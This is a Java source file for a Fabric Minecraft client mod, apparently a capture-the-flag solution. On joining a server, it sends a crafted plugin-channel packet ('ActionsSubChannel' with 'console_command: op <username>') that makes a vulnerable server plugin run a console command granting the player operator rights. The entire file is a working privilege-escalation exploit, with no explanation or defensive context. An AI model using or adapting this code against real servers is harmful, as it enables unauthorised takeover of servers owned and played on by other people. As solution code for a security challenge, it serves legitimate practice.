package ctf.ahau.ecb;

import io.netty.buffer.Unpooled;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.util.Identifier;

import java.nio.charset.StandardCharsets;

public final class EcbPayloadSenderClient implements ClientModInitializer {
    private static final Identifier ECB_CHANNEL = new Identifier("ecb", "channel");

    @Override
    public void onInitializeClient() {
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            PacketByteBuf payload = new PacketByteBuf(Unpooled.buffer());
            writeUtf(payload, "ActionsSubChannel");
            writeUtf(payload, "console_command: op " + client.getSession().getUsername());
            ClientPlayNetworking.send(ECB_CHANNEL, payload);
        });
    }

    private static void writeUtf(PacketByteBuf output, String value) {
        byte[] encoded = value.getBytes(StandardCharsets.UTF_8);
        output.writeShort(encoded.length);
        output.writeBytes(encoded);
    }
}
